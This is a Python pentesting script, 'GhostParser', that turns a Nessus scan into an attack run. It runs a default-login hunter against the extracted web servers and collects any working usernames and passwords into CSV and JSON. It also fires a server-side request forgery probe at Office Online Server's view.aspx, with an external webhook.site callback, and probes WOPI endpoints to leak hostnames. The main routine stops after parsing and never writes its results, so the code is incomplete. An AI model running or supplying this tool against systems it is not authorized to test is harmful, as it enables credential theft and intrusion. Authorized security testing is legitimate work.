#!/usr/bin/env python3
"""
GhostParser.py

Parse default-http-login-hunter output, clean noise, group credentials per host
into a single CSV cell, print a Ghost Energy–themed banner on start, clone &
run default-http-login-hunter, extract web servers from a Nessus file (built-in),
run an OOS SSRF check against those targets, run the hunter on the extracted list
(from inside the hunter repo), stream ALL raw hunter output to the console (and
to hunter_raw.txt), then parse and write grouped CSV/JSON results.

Usage:
    python3 GhostParser.py hunter_output.txt
    python3 GhostParser.py -n scan.nessus
    python3 GhostParser.py -n scan.nessus --outdir results

Flags:
    --redact            : redact passwords in the CSV output (replace with 'REDACTED')
    --sep SEP           : separator used to join creds in CSV (default: '; ')
    --no-color          : disable ANSI color output
    --width N           : banner total width (default: 72)
    --clone / --no-clone: clone the default-http-login-hunter repo (default: clone)
    --repo DIR          : directory to clone repo into (default: ./default-http-login-hunter)
    -n, --nessus FILE   : path to a Nessus XML file to extract web servers from
    --webservers FILE   : path to produced web servers list (default: web_servers.txt)
    --hunter-out FILE   : raw hunter output path (default: hunter_raw.txt)
    --no-run-hunter     : skip running the hunter even if repo exists
    --outdir DIR        : output directory for CSV/JSON files (default: .)
    --stdout            : also print one-line summary per host to stdout
    --no-ssrf-check     : skip the OOS SSRF check
    --ssrf-threads N    : threads for SSRF scanner (default: 10)
    --ssrf-timeout SEC  : max wait for OOB callback (default: 15)
    --ssrf-webhook TOKEN: reuse an existing webhook.site token
    --ssrf-output FILE  : write SSRF-vulnerable targets here (default: ssrf_results.txt)
"""
from __future__ import annotations
import sys
import re
import csv
import json
import argparse
import subprocess
import shutil
import time
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from datetime import datetime, timezone
import xml.etree.ElementTree as ET

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    _SSRF_AVAILABLE = True
except ImportError:
    _SSRF_AVAILABLE = False

try:
    import openpyxl
    from openpyxl.styles import PatternFill, Font, Alignment, Border, Side
    _EXCEL_AVAILABLE = True
except ImportError:
    _EXCEL_AVAILABLE = False

__version__ = "3.0"
__author__ = "GhostParser"

ANSI = {
    "bold": "\033[1m",
    "reset": "\033[0m",
    "cyan": "\033[96m",
    "magenta": "\033[95m",
    "green": "\033[92m",
    "yellow": "\033[93m",
    "white": "\033[97m",
}

def colorize(s: str, code: str, use_color: bool = True) -> str:
    if not use_color:
        return s
    return f"{ANSI.get(code, '')}{s}{ANSI['reset']}"

BANNER_LINES = [
    r"       .-.",
    r"      (o o)   GHOST",
    r"     |  O  |  PARSER",
    r"      \   /   ",
    r"     __) (__",
    r"    /  `-'  \   Ghost Energy™ style",
    r"   / /| . |\ \  Scan • Check • Export",
    r"  /_/ |_| |_\_\ ",
]

def print_banner(use_color: bool = True, total_width: int = 72):
    total_width = max(48, min(120, total_width))
    art_width = max(len(ln) for ln in BANNER_LINES) + 2
    meta_width = total_width - art_width - 6
    if meta_width < 20:
        meta_width = 20
    meta_lines = [
        f" GhostParser v{__version__}",
        f" by {__author__}",
        f" {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        " Clean • Group • Export",
    ]
    top = colorize("╔" + "═" * (total_width - 2) + "╗", "magenta", use_color)
    bottom = colorize("╚" + "═" * (total_width - 2) + "╝", "magenta", use_color)
    print(top)
    for i in range(max(len(BANNER_LINES), len(meta_lines))):
        art_ln = BANNER_LINES[i] if i < len(BANNER_LINES) else ""
        art_col = art_ln.ljust(art_width)
        meta_ln = meta_lines[i] if i < len(meta_lines) else ""
        if len(meta_ln) > meta_width:
            meta_ln = meta_ln[: max(0, meta_width - 3)] + "..."
        art_col_colored = colorize(art_col, "cyan", use_color)
        meta_colored = colorize(meta_ln.ljust(meta_width), "magenta", use_color)
        line = colorize("║ ", "magenta", use_color) + art_col_colored + " " + meta_colored + colorize(" ║", "magenta", use_color)
        print(line)
    print(bottom)
    print()

# ---------------- Parsing helpers ----------------

def extract_ip_port(header: str) -> tuple[str | None, int | None]:
    ip_port_re = re.compile(r"(?P<ip>(?:\d{1,3}\.){3}\d{1,3})[:\.](?P<port>\d{1,5})")
    m = ip_port_re.search(header)
    if m:
        try:
            return m.group("ip"), int(m.group("port"))
        except Exception:
            return m.group("ip"), None
    ip_re = re.compile(r"((?:\d{1,3}\.){3}\d{1,3})")
    ipm = ip_re.search(header)
    if ipm:
        ip = ipm.group(1)
        after = header[ipm.end() :]
        portm = re.search(r"[:\.\s](\d{1,5})", after)
        if portm:
            try:
                return ip, int(portm.group(1))
            except ValueError:
                return ip, None
        return ip, None
    return None, None

def is_useless_timestamp_line(line: str) -> bool:
    if not line:
        return False
    if "trying default http logins on" in line.lower() or "already tried default http logins" in line.lower():
        return True
    return False

def is_junk_header(hdr: str) -> bool:
    if not hdr or not hdr.strip():
        return True
    if "error: http request table is empty" in hdr.lower():
        return True
    if "trying default http logins on" in hdr.lower():
        return True
    if re.fullmatch(r"[_\|\s\-]+", hdr.strip()):
        return True
    if hdr.strip().startswith("_") and len(hdr.strip()) < 80:
        if not re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", hdr):
            return True
    return False

def is_junk_cred(u: str | None, p: str | None) -> bool:
    if not u or not p:
        return True
    u = u.strip()
    p = p.strip()
    if not u or not p:
        return True
    if re.fullmatch(r"[_\|\-]{1,10}", u) or re.fullmatch(r"[_\|\-]{1,10}", p):
        return True
    return False

def parse(text: str) -> list[dict]:
    results: list[dict] = []
    lines = text.splitlines()
    header_re = re.compile(r"^\|\s*(?P<header>.+)$")
    bracket_re = re.compile(r"\[([^\]]+)\]")
    cred_re = re.compile(r"([A-Za-z0-9_.+\-]{1,64}):([^\s:]{1,128})")
    cur = None
    for ln in lines:
        s = ln.rstrip("\n")
        if is_useless_timestamp_line(s):
            continue
        m = header_re.match(s.strip())
        if m and ("http" in s.lower() or re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", s)):
            if cur is not None and cur.get("creds"):
                results.append(cur)
            header = m.group("header").strip()
            ip, port = extract_ip_port(header)
            cur = {"host_header": header, "ip": ip, "port": port, "display_name": None, "creds": [], "raw_block": [s.strip()]}
            continue
        if cur is not None:
            cur["raw_block"].append(s.strip())
            b = bracket_re.search(s)
            if b:
                cur["display_name"] = b.group(1).strip()
            if is_useless_timestamp_line(s):
                continue
            for user, pw in cred_re.findall(s):
                if user.lower().startswith("http") or user.lower().endswith("http"):
                    continue
                if re.match(r"^\d+\.\d+\.\d+\.\d+$", user):
                    continue
                if user in ("at", "www", "http", "https"):
                    continue
                cur["creds"].append({"username": user.strip(), "password": pw.strip(), "raw_line": s.strip()})
    if cur is not None and cur.get("creds"):
        results.append(cur)
    return results

def clean_parsed(parsed: list[dict]) -> list[dict]:
    cleaned: list[dict] = []
    for block in parsed:
        hdr = (block.get("host_header") or "").strip()
        if is_junk_header(hdr):
            continue
        good_creds = []
        for c in block.get("creds", []):
            u = (c.get("username") or "").strip()
            p = (c.get("password") or "").strip()
            raw = (c.get("raw_line") or "")
            if is_useless_timestamp_line(raw):
                continue
            if is_junk_cred(u, p):
                continue
            good_creds.append({"username": u, "password": p, "raw_line": raw})
        if not good_creds:
            continue
        nb = {
            "host_header": hdr,
            "ip": block.get("ip"),
            "port": block.get("port"),
            "display_name": block.get("display_name"),
            "creds": good_creds,
            "raw_block": block.get("raw_block", []),
        }
        cleaned.append(nb)
    return cleaned

def write_outputs_grouped(parsed: list[dict], outdir: Path, redact: bool = False, sep: str = "; ", also_stdout: bool = False):
    outdir.mkdir(parents=True, exist_ok=True)
    csv_out = outdir / "hunter_parsed_grouped.csv"
    json_out = outdir / "hunter_parsed_grouped.json"
    with csv_out.open("w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["host_header", "ip", "port", "display_name", "all_creds", "raw_block"])
        writer.writeheader()
        for block in parsed:
            creds_joined = []
            for c in block.get("creds", []):
                user = c["username"]
                pw = "REDACTED" if redact else c["password"]
                creds_joined.append(f"{user}:{pw}")
            creds_joined_str = sep.join(creds_joined)
            writer.writerow(
                {
                    "host_header": block.get("host_header", ""),
                    "ip": block.get("ip", "") or "",
                    "port": block.get("port", "") or "",
                    "display_name": block.get("display_name", "") or "",
                    "all_creds": creds_joined_str,
                    "raw_block": "\\n".join(block.get("raw_block", [])),
                }
            )
    with json_out.open("w") as f:
        json.dump(parsed, f, indent=2)
    total_creds = sum(len(b.get("creds", [])) for b in parsed)
    print(f"Parsed {total_creds} credential entries across {len(parsed)} host blocks.")
    print(f"CSV -> {csv_out.resolve()}")
    print(f"JSON -> {json_out.resolve()}")
    if also_stdout:
        for block in parsed:
            host = block.get("host_header", "")
            creds = "; ".join(f"{c['username']}:{('REDACTED' if redact else c['password'])}" for c in block.get("creds", []))
            print(f"{host}  ->  {creds}")

# ---------------- Command helpers ----------------

def run_cmd(cmd: list[str], cwd: Path | None = None, capture: bool = False, check: bool = False):
    try:
        if capture:
            res = subprocess.run(cmd, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=check)
            return res.stdout, res.stderr, res.returncode
        else:
            res = subprocess.run(cmd, cwd=cwd, check=check)
            return None, None, res.returncode
    except subprocess.CalledProcessError as e:
        return getattr(e, "stdout", ""), getattr(e, "stderr", ""), getattr(e, "returncode", 1)
    except FileNotFoundError:
        return "", f"command not found: {cmd[0]}", 127

def find_hunter_script(repo_dir: Path) -> Path | None:
    repo = Path(repo_dir)
    if not repo.exists():
        return None
    # Prefer explicit-named runners near root
    patterns = [
        "default-http-login-hunter.sh",
        "*default*login*hunter*.sh",
        "*default*login*hunter*",
    ]
    for pat in patterns:
        for p in repo.glob(pat):
            if p.is_file():
                return p
    # prefer .sh near root
    for p in repo.rglob("*.sh"):
        rel = p.relative_to(repo)
        if len(rel.parts) <= 3:
            return p
    # any .sh anywhere
    for p in repo.rglob("*.sh"):
        return p
    # any file with 'hunter' in name
    for p in repo.rglob("*hunter*"):
        if p.is_file():
            return p
    return None

def clone_repo(repo_url: str, target: Path, use_color: bool):
    if target.exists():
        print(colorize(f"[i] repo directory exists: {target}", "yellow", use_color))
        return True
    git_path = shutil.which("git")
    if not git_path:
        print(colorize("[!] git not found on PATH; cannot clone repository.", "yellow", use_color))
        return False
    print(colorize(f"[i] Cloning {repo_url} -> {target}", "green", use_color))
    out, err, rc = run_cmd(["git", "clone", repo_url, str(target)], capture=True)
    if rc != 0:
        print(colorize(f"[!] git clone failed: {err or out}", "yellow", use_color))
        return False
    return True

# ---------------- Nessus extractor (built-in) ----------------

COMMON_SSL_PORTS = {"443", "8443", "9443", "10443"}

def extract_web_servers_from_nessus_builtin(nessus_file: Path, output_file: Path, use_color: bool) -> bool:
    try:
        tree = ET.parse(str(nessus_file))
        root = tree.getroot()
    except Exception as e:
        print(colorize(f"[!] failed to parse nessus file: {e}", "yellow", use_color))
        return False
    web_servers = set()
    for report_host in root.iter("ReportHost"):
        host_ip = report_host.attrib.get("name", "").strip()
        for item in report_host.iter("ReportItem"):
            svc_name = (item.attrib.get("svc_name", "") or "").lower()
            port = item.attrib.get("port", "").strip()
            if "http" in svc_name or "www" in svc_name:
                if "ssl" in svc_name or port in COMMON_SSL_PORTS:
                    protocol = "https"
                else:
                    protocol = "http"
                if host_ip:
                    web_servers.add(f"{protocol}://{host_ip}:{port}")
    try:
        with output_file.open("w") as fh:
            for server in sorted(web_servers):
                fh.write(server + "\n")
    except Exception as e:
        print(colorize(f"[!] failed to write web servers file: {e}", "yellow", use_color))
        return False
    print(colorize(f"[i] extracted {len(web_servers)} web servers to '{output_file}'", "green", use_color))
    return True

# ---------------- hunter-run helpers ----------------

def count_webservers(webservers_path: Path) -> int:
    if not webservers_path.exists():
        return 0
    cnt = 0
    for line in webservers_path.read_text(errors="ignore").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        cnt += 1
    return cnt

def _copy_webservers_into_repo(webservers: Path, repo_dir: Path, use_color: bool) -> Path | None:
    try:
        repo_dir.mkdir(parents=True, exist_ok=True)
        dest = repo_dir / webservers.name
        # if already same file, return it
        try:
            if webservers.resolve().samefile(dest):
                return webservers
        except Exception:
            pass
        shutil.copy2(str(webservers), str(dest))
        return dest
    except Exception as e:
        try:
            dest = repo_dir / webservers.name
            if dest.exists():
                dest.unlink()
            dest.symlink_to(webservers.resolve())
            return dest
        except Exception as e2:
            print(colorize(f"[!] failed to copy or link webservers into repo: {e} / {e2}", "yellow", use_color))
            return None

def run_hunter(hunter_script: Path, webservers: Path, hunter_out: Path, use_color: bool):
    """
    Simple runner: copies/symlinks webservers file into repo_dir, runs the hunter
    from inside the repo using the runner basename; streams ALL raw output to
    stdout and writes to hunter_out. If method1 fails, falls back to absolute path.
    """
    if not hunter_script or not hunter_script.exists():
        print(colorize(f"[!] hunter script not found: {hunter_script}", "yellow", use_color))
        return False

    repo_dir = hunter_script.parent
    if not webservers.exists():
        print(colorize(f"[!] web servers list not found: {webservers}", "yellow", use_color))
        return False

    local_ws = _copy_webservers_into_repo(webservers, repo_dir, use_color)
    if not local_ws:
        print(colorize("[!] unable to make webservers available inside hunter repo; aborting run.", "yellow", use_color))
        return False

    runner_basename = hunter_script.name
    abs_runner = str(hunter_script.resolve())
    abs_ws = str(local_ws.resolve())

    def _stream_proc(cmd: list[str], cwd: Path | None):
        try:
            with hunter_out.open("a") as fh:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=cwd, text=True, bufsize=1)
                try:
                    for raw_line in proc.stdout:
                        if raw_line is None:
                            break
                        line = raw_line.rstrip("\n")
                        fh.write(line + "\n")
                        fh.flush()
                        # print every raw line immediately
                        print(line)
                    rc = proc.wait()
                    return rc
                except KeyboardInterrupt:
                    proc.terminate()
                    proc.wait()
                    print("\n[!] Hunter run interrupted by user.")
                    return 130
        except FileNotFoundError as e:
            print(colorize(f"[!] runner command not found: {e}", "yellow", use_color))
            return 127
        except Exception as e:
            print(colorize(f"[!] error running process: {e}", "yellow", use_color))
            return 1

    # Attempt 1: run from inside repo using basename
    print(colorize(f"[i] running hunter: cd {repo_dir} && bash {runner_basename} {local_ws.name} -> {hunter_out}", "green", use_color))
    # ensure hunter_out exists/truncated
    try:
        hunter_out.parent.mkdir(parents=True, exist_ok=True)
        hunter_out.unlink(missing_ok=True)
    except Exception:
        pass
    hunter_out.write_text("")  # create/truncate

    rc1 = _stream_proc(["bash", runner_basename, local_ws.name], cwd=repo_dir)
    if rc1 == 0:
        return True
    print(colorize(f"[debug] method1 returned rc {rc1}; trying fallback", "yellow", use_color))

    # Fallback: run with absolute paths (no cwd)
    print(colorize(f"[i] running hunter (fallback): bash {abs_runner} {abs_ws} -> {hunter_out}", "green", use_color))
    rc2 = _stream_proc(["bash", abs_runner, abs_ws], cwd=None)
    if rc2 != 0:
        print(colorize(f"[!] hunter returned rc {rc2} on fallback", "yellow", use_color))
        return False
    return True

# ---------------- OOS SSRF check (inlined) ----------------

# Shared HTTP session and print lock — initialised on first use
_ssrf_session: object = None
_ssrf_lock = threading.Lock()

# Table geometry
_W_TGT  = 35
_W_WOPI = 24
_W_SSRF = 32
_W_ALL  = _W_TGT + _W_WOPI + _W_SSRF + 6

# Compact ANSI shortcuts used inside the SSRF table
_SR = "\033[91m";  _SG = "\033[92m";  _SY = "\033[93m"
_SC = "\033[96m";  _SB = "\033[1m";   _SD = "\033[2m";  _SE = "\033[0m"


def _ssrf_session_get():
    """Lazily create the shared requests.Session."""
    global _ssrf_session
    if _ssrf_session is None and _SSRF_AVAILABLE:
        s = requests.Session()
        s.verify = False
        a = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
        s.mount("https://", a)
        s.mount("http://", a)
        _ssrf_session = s
    return _ssrf_session


def _ssrf_vlen(text: str) -> int:
    return len(re.sub(r"\033\[[0-9;]*m", "", text))


def _ssrf_pad(text: str, width: int) -> str:
    return text + " " * max(0, width - _ssrf_vlen(text))


def _ssrf_row(tgt: str, wopi: str, ssrf: str):
    line = f"  {_ssrf_pad(tgt, _W_TGT)}  {_ssrf_pad(wopi, _W_WOPI)}  {ssrf}"
    with _ssrf_lock:
        print(line, flush=True)


def _ssrf_header():
    print(f"  {_SB}{_ssrf_pad('Target', _W_TGT)}  {_ssrf_pad('WOPI Endpoint', _W_WOPI)}  {_ssrf_pad('SSRF', _W_SSRF)}{_SE}")
    print(f"  {'\u2500' * _W_TGT}  {'\u2500' * _W_WOPI}  {'\u2500' * _W_SSRF}")


def _ssrf_truncate(target: str) -> str:
    t = target.replace("https://", "").replace("http://", "")
    return t[:_W_TGT - 4] + "..." if len(t) > _W_TGT - 1 else t


def _ssrf_create_webhook() -> str:
    resp = _ssrf_session_get().post(
        "https://webhook.site/token",
        headers={"Accept": "application/json"},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["uuid"]


def _ssrf_check_target(target: str, webhook_token: str, callback_timeout: int) -> dict:
    sess = _ssrf_session_get()
    td = _ssrf_truncate(target)
    result = {"target": target, "oos": False, "version": None,
              "hostname": None, "vulnerable": False, "callback_ip": None}

    # 1. Fingerprint
    try:
        r = sess.get(f"{target}/op/view.aspx", timeout=10, allow_redirects=False)
        v = r.headers.get("X-OfficeVersion")
        if v:
            result["oos"] = True
            result["version"] = v
    except Exception:
        pass

    if not result["oos"]:
        _ssrf_row(td, f"{_SD}N/A{_SE}", f"{_SD}N/A (not OOS){_SE}")
        return result

    # 2. WOPI hostname
    try:
        r = sess.get(f"{target}/oh/wopi/files/@/wFileId?wFileId=test", timeout=10)
        m = r.headers.get("X-WOPI-MachineName")
        if m:
            result["hostname"] = m
    except Exception:
        pass

    wopi_str = (f"{_SG}{_SB}{result['hostname']}{_SE}"
                if result["hostname"] else f"{_SR}NOT VULNERABLE{_SE}")

    # 3. Fire SSRF
    tid = uuid.uuid4().hex[:8]
    cb_url = f"https://webhook.site/{webhook_token}/{tid}.docx"
    try:
        sess.get(f"{target}/op/view.aspx?src={cb_url}", timeout=15)
    except Exception:
        _ssrf_row(td, wopi_str, f"{_SR}NOT VULN{_SE} {_SD}(req failed){_SE}")
        return result

    # 4. Poll for callback
    poll = f"https://webhook.site/token/{webhook_token}/requests?sorting=newest"
    waited = 0
    while waited < callback_timeout:
        time.sleep(2)
        waited += 2
        try:
            r = sess.get(poll, headers={"Accept": "application/json"}, timeout=10)
            matched = [x for x in r.json().get("data", []) if tid in x.get("url", "")]
            if matched:
                ip = matched[0].get("ip", "unknown")
                result["vulnerable"] = True
                result["callback_ip"] = ip
                _ssrf_row(td, wopi_str, f"{_SG}{_SB}VULN{_SE} {_SG}<- {ip}{_SE}")
                return result
        except Exception:
            pass

    _ssrf_row(td, wopi_str, f"{_SR}NOT VULN{_SE}")
    return result


def _ssrf_summary(results: list[dict]):
    vuln  = sum(1 for r in results if r["vulnerable"])
    oos   = sum(1 for r in results if r["oos"])
    wopi  = sum(1 for r in results if r["hostname"])
    total = len(results)
    print(f"\n  {'\u2500' * _W_ALL}")
    s = (f"  {_SB}Scanned:{_SE} {total}   {_SB}OOS:{_SE} {oos}   "
         f"{_SB}WOPI Leak:{_SE} ")
    s += (f"{_SG}{wopi}{_SE}   " if wopi else f"{wopi}   ")
    s += f"{_SB}SSRF:{_SE} "
    s += (f"{_SG}{_SB}{vuln}{_SE}" if vuln else str(vuln))
    print(s)
    print(f"  {'\u2500' * _W_ALL}\n")


def _ssrf_write_excel(results: list[dict], out_path: Path, use_color: bool):
    """Write all SSRF results to a colour-coded Excel workbook."""
    if not _EXCEL_AVAILABLE:
        # Fallback: write plain CSV
        csv_path = out_path.with_suffix(".csv")
        with csv_path.open("w", newline="") as f:
            import csv as _csv
            w = _csv.writer(f)
            w.writerow(["Target", "WOPI Endpoint", "SSRF"])
            for r in results:
                w.writerow([r["target"], r["hostname"] or "N/A",
                            (f"VULN <- {r['callback_ip']}" if r["vulnerable"]
                             else ("NOT VULN" if r["oos"] else "N/A (not OOS)"))])
        print(colorize(f"[i] openpyxl not installed — results saved as CSV: {csv_path}", "yellow", use_color))
        print(colorize("      pip install openpyxl   to enable Excel output", "yellow", use_color))
        return

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "SSRF Results"

    # ── Fills ────────────────────────────────────────────────────────
    hdr_fill  = PatternFill("solid", fgColor="1F1F2E")   # dark navy header
    vuln_fill = PatternFill("solid", fgColor="C6EFCE")   # light green
    safe_fill = PatternFill("solid", fgColor="FFCCCC")   # light red
    oos_fill  = PatternFill("solid", fgColor="FFEB9C")   # light yellow (OOS but no SSRF)
    grey_fill = PatternFill("solid", fgColor="F2F2F2")   # light grey (not OOS)
    thin      = Side(style="thin", color="CCCCCC")
    border    = Border(left=thin, right=thin, top=thin, bottom=thin)

    # ── Header row ───────────────────────────────────────────────────
    headers = ["Target", "WOPI Endpoint", "SSRF", "OOS Version", "Callback IP"]
    col_widths = [45, 30, 30, 20, 18]
    for col, (h, w) in enumerate(zip(headers, col_widths), start=1):
        cell = ws.cell(row=1, column=col, value=h)
        cell.font      = Font(bold=True, color="FFFFFF", size=11)
        cell.fill      = hdr_fill
        cell.alignment = Alignment(horizontal="center", vertical="center")
        cell.border    = border
        ws.column_dimensions[openpyxl.utils.get_column_letter(col)].width = w
    ws.row_dimensions[1].height = 20
    ws.freeze_panes = "A2"

    # ── Data rows ────────────────────────────────────────────────────
    for row_idx, r in enumerate(results, start=2):
        if not r["oos"]:
            wopi_val = "N/A"
            ssrf_val = "N/A (not OOS)"
            fill     = grey_fill
        elif r["vulnerable"]:
            wopi_val = r["hostname"] or "—"
            ssrf_val = f"VULN   ← {r['callback_ip']}"
            fill     = vuln_fill
        elif r["hostname"]:
            wopi_val = r["hostname"]
            ssrf_val = "NOT VULN"
            fill     = oos_fill
        else:
            wopi_val = "NOT VULNERABLE"
            ssrf_val = "NOT VULN"
            fill     = safe_fill

        row_data = [
            r["target"],
            wopi_val,
            ssrf_val,
            r.get("version") or "",
            r.get("callback_ip") or "",
        ]
        for col, val in enumerate(row_data, start=1):
            cell = ws.cell(row=row_idx, column=col, value=val)
            cell.fill      = fill
            cell.border    = border
            cell.alignment = Alignment(vertical="center")
            if col == 3 and r["vulnerable"]:
                cell.font  = Font(bold=True, color="375623")

    # ── Auto-filter ──────────────────────────────────────────────────
    ws.auto_filter.ref = f"A1:{openpyxl.utils.get_column_letter(len(headers))}{len(results) + 1}"

    try:
        wb.save(str(out_path))
    except Exception as e:
        print(colorize(f"[!] Could not save Excel file: {e}", "yellow", use_color))
        return
    print(colorize(f"[+] SSRF results written to {out_path}  ({len(results)} rows)", "green", use_color))


def run_ssrf_check(
    webservers: Path,
    *,
    ssrf_threads: int,
    ssrf_timeout: int,
    ssrf_webhook: str | None,
    ssrf_output: Path,
    use_color: bool,
):
    """Run the inlined OOS SSRF scanner against every target in webservers."""
    if not _SSRF_AVAILABLE:
        print(colorize(
            "[!] SSRF check skipped — install missing packages:\n"
            "      python3 -m pip install requests urllib3",
            "yellow", use_color,
        ))
        return

    targets = [
        ln.strip() for ln in webservers.read_text(errors="ignore").splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]
    if not targets:
        print(colorize("[!] webservers file is empty — skipping SSRF check.", "yellow", use_color))
        return
    targets = [t if t.startswith("http") else f"https://{t}" for t in targets]
    targets = [t.rstrip("/") for t in targets]

    print()
    print(colorize("[i] \u2500\u2500\u2500 OOS SSRF Check \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500", "cyan", use_color))
    print(colorize(f"[i] Targets: {len(targets)}   Threads: {ssrf_threads}   Timeout: {ssrf_timeout}s", "green", use_color))

    # Webhook
    if ssrf_webhook:
        token = ssrf_webhook
        print(colorize(f"[i] Webhook: (reusing) {token}", "green", use_color))
    else:
        try:
            token = _ssrf_create_webhook()
            print(colorize(f"[i] Webhook: https://webhook.site/{token}", "green", use_color))
        except Exception as e:
            print(colorize(f"[!] Failed to create webhook: {e} — skipping SSRF check.", "yellow", use_color))
            return

    print()
    _ssrf_header()

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=ssrf_threads) as pool:
        futures = {pool.submit(_ssrf_check_target, t, token, ssrf_timeout): t for t in targets}
        for future in as_completed(futures):
            results.append(future.result())

    _ssrf_summary(results)
    _ssrf_write_excel(results, ssrf_output, use_color)
    print(colorize("[i] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500", "cyan", use_color))
    print()


# ---------------- Arg parsing ----------------

def build_argparser():
    p = argparse.ArgumentParser(prog="GhostParser", description="OOS SSRF check + default-http-login-hunter parser")
    p.add_argument("infile", metavar="INFILE", type=Path, nargs="?", help="hunter output text file (or '-' for stdin)")
    p.add_argument("--redact", action="store_true", help="redact passwords in CSV output")
    p.add_argument("--sep", default="; ", help="separator to join multiple credentials in CSV (default: '; ')")
    p.add_argument("--no-color", action="store_true", help="disable ANSI color output")
    p.add_argument("--width", type=int, default=72, help="banner total width (default 72)")
    p.add_argument("--clone", dest="clone", action="store_true", help="clone the default-http-login-hunter repo", default=True)
    p.add_argument("--no-clone", dest="clone", action="store_false", help="do not clone repo")
    p.add_argument("--repo", default="default-http-login-hunter", help="repo directory (default ./default-http-login-hunter)")
    p.add_argument("-n", "--nessus", help="Nessus XML file to extract web servers from (optional)")
    p.add_argument("--webservers", default="web_servers.txt", help="web servers list file (default web_servers.txt)")
    p.add_argument("--hunter-out", default="hunter_raw.txt", help="raw hunter output file (default hunter_raw.txt)")
    p.add_argument("--no-run-hunter", action="store_true", help="skip running the hunter even if repo exists")
    p.add_argument("--outdir", default=".", help="output directory for CSV/JSON files")
    p.add_argument("--stdout", action="store_true", help="also print one-line summary per host to stdout")
    # OOS SSRF check
    p.add_argument("--ssrf-check", dest="ssrf_check", action="store_true", default=True,
                   help="run oos_ssrf_check.py against web servers before the hunter (default: on)")
    p.add_argument("--no-ssrf-check", dest="ssrf_check", action="store_false",
                   help="skip the OOS SSRF check")
    p.add_argument("--ssrf-threads", type=int, default=10, metavar="N",
                   help="threads for SSRF scanner (default: 10)")
    p.add_argument("--ssrf-timeout", type=int, default=15, metavar="SEC",
                   help="max seconds to wait for OOB callbacks (default: 15)")
    p.add_argument("--ssrf-webhook", default=None, metavar="TOKEN",
                   help="reuse an existing webhook.site token")
    p.add_argument("--ssrf-output", default="ssrf_results.xlsx", metavar="FILE",
                   help="Excel file for SSRF results (default: ssrf_results.xlsx)")
    return p

# ---------------- Main ----------------

def main(argv=None):
    argv = argv if argv is not None else sys.argv[1:]
    ap = build_argparser()
    args = ap.parse_args(argv)
    use_color = not args.no_color and sys.stdout.isatty()
    print_banner(use_color=use_color, total_width=args.width)
    outdir = Path(args.outdir)

    repo_dir = Path(args.repo)
    if args.clone:
        ok = clone_repo("https://github.com/InfosecMatter/default-http-login-hunter.git", repo_dir, use_color)
        if not ok:
            print(colorize("[!] clone failed (or skipped). If you already have the repo, set --no-clone.", "yellow", use_color))

    hunter_script = None
    if not args.no_run_hunter and repo_dir.exists():
        hunter_script = find_hunter_script(repo_dir)
        if not hunter_script:
            print(colorize(f"[!] could not find a hunter script in {repo_dir}; you may need to run the hunter manually.", "yellow", use_color))

    webservers_path = Path(args.webservers)
    if args.nessus:
        nessus_path = Path(args.nessus)
        if not nessus_path.exists():
            print(colorize(f"[!] Nessus file not found: {nessus_path}", "yellow", use_color))
            sys.exit(2)
        ok = extract_web_servers_from_nessus_builtin(nessus_path, webservers_path, use_color)
        if not ok:
            print(colorize("[!] extraction failed; aborting.", "yellow", use_color))
            sys.exit(1)

    # OOS SSRF check — runs against the web servers list before the hunter
    if args.ssrf_check and webservers_path.exists():
        run_ssrf_check(
            webservers_path,
            ssrf_threads=args.ssrf_threads,
            ssrf_timeout=args.ssrf_timeout,
            ssrf_webhook=args.ssrf_webhook,
            ssrf_output=Path(args.ssrf_output),
            use_color=use_color,
        )
    elif args.ssrf_check and not webservers_path.exists():
        print(colorize(f"[!] Web servers file not found ({webservers_path}); skipping SSRF check.", "yellow", use_color))

    # If hunter should run and we found a runner
    if not args.no_run_hunter and hunter_script:
        ok = run_hunter(hunter_script, webservers_path, Path(args.hunter_out), use_color)
        if not ok:
            print(colorize("[!] hunter run failed; if you already have hunter output, specify its path as INFILE.", "yellow", use_color))

    # Determine input text for parsing
    if args.infile:
        if args.infile == Path("-"):
            text = sys.stdin.read()
        else:
            infile_path = args.infile
            if not infile_path.exists():
                print(colorize(f"[!] input file not found: {infile_path}", "yellow", use_color))
                sys.exit(2)
            text = infile_path.read_text(errors="ignore")
    else:
        hunter_out = Path(args.hunter_out)
        if hunter_out.exists():
            text = hunter_out.read_text(errors="ignore")
        else:
            # Hunter never ran (no git, no repo, or --no-run-hunter) — SSRF-only run is valid
            if args.no_run_hunter or not hunter_script:
                print(colorize("[i] No hunter output to parse — SSRF scan complete.", "cyan", use_color))
                sys.exit(0)
            print(colorize("[!] No input file provided and hunter output not found. Use INFILE or run with -n/--nessus to auto-generate.", "yellow", use_color))
            sys.exit(2)

    parsed = parse(text)
    cleaned = clean_parsed(parsed)
